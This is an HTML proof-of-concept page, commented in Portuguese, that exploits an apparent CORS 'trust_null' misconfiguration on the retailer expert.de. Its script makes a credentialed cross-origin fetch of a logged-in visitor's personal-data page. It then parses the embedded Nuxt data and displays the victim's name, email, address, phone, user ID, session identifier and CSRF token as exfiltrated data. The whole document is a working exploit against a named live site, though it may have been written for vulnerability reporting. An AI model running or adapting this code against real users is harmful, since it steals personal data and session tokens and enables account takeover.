<!DOCTYPE html>
<html>
<head><title>CORS PoC - expert.de</title></head>
<body>
<h2>CORS PoC — expert.de — trust_null</h2>
<p>Status: <b id="status">Aguardando...</b></p>
<div id="dados" style="display:none;background:#fff3cd;border:2px solid red;padding:15px;border-radius:8px;margin:10px 0">
  <h3 style="color:red">Dados Exfiltrados:</h3>
  <pre id="extraido" style="font-size:13px"></pre>
</div>
<pre id="output" style="background:#f5f5f5;padding:10px;font-size:11px;max-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-all"></pre>

<script>
// Vetor direto — sem iframe
// O browser envia cookies de expert.de se o usuario estiver logado
// CORS trust_null permite a leitura da resposta

document.getElementById('status').textContent = 'Fazendo fetch...';

fetch('https://www.expert.de/shop/mein-expert/persoenliche-daten', {
  method: 'GET',
  credentials: 'include',
  mode: 'cors'
})
.then(function(r) {
  var acao = r.headers.get('access-control-allow-origin');
  var acac = r.headers.get('access-control-allow-credentials');
  document.getElementById('output').textContent =
    'ACAO: ' + acao + '\nACAC: ' + acac + '\nStatus: ' + r.status;
  return r.text();
})
.then(function(html) {
  document.getElementById('output').textContent += '\nBytes: ' + html.length;

  // Extrair __NUXT_DATA__
  var match = html.match(/<script[^>]+id="__NUXT_DATA__"[^>]*>([\s\S]*?)<\/script>/);
  if (!match) {
    document.getElementById('status').innerHTML =
      '<span style="color:orange">Resposta recebida mas sem __NUXT_DATA__ — usuário não autenticado no fetch.</span>';
    return;
  }

  var arr = JSON.parse(match[1]);
  var dados = {};
  var campos = {
    firstName:'Nome', lastName:'Sobrenome', email:'Email',
    street:'Rua', houseNumber:'Número', zip:'CEP', city:'Cidade',
    countryCode:'País', telephone:'Telefone', userId:'UserID',
    sessionIdentifier:'SessionID', csrfToken:'CSRF Token'
  };

  for (var i = 0; i < arr.length; i++) {
    var item = arr[i];
    if (item && typeof item === 'object' && !Array.isArray(item)) {
      Object.keys(campos).forEach(function(campo) {
        if (item[campo] !== undefined) {
          var val = arr[item[campo]];
          if (val && typeof val === 'string' && val !== 'null') {
            dados[campo] = val;
          }
        }
      });
    }
  }

  var linhas = Object.keys(campos).map(function(k) {
    return dados[k] ? campos[k] + ': ' + dados[k] : null;
  }).filter(Boolean);

  if (linhas.length > 0) {
    document.getElementById('extraido').textContent = linhas.join('\n');
    document.getElementById('dados').style.display = 'block';
    document.getElementById('status').innerHTML =
      '<span style="color:red;font-size:16px">VULNERÁVEL — Dados exfiltrados!</span>';
  } else {
    document.getElementById('status').innerHTML =
      '<span style="color:orange">__NUXT_DATA__ encontrado mas sem dados de auth — cookies de sessão não foram enviados.</span>';
  }
})
.catch(function(e) {
  document.getElementById('status').innerHTML =
    '<span style="color:red">ERRO: ' + e + '</span>';
  document.getElementById('output').textContent = e.toString();
});
</script>
</body>
</html>
